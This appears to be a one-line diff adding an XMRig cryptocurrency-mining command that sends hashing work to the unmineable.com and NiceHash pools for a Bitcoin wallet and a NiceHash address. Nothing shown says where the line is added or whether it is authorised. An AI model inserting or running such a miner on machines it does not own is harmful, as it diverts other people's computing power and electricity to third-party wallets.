@@ -1,0 +1,1 @@
+./xmrig -o rx.unmineable.com:3333 -u BTC:bc1qgmtqg60kkw5e858tyg7ah0hd43c6kwcngs5u6f.HAGAN -p x -k -a rx/0 -o stratum+tcp://randomxmonero.auto.nicehash.com:9200 -u NHbLYH412J3a9V6x2yJzb32m4Gouz7TXbhCe -p x -k --nicehash -a rx/0
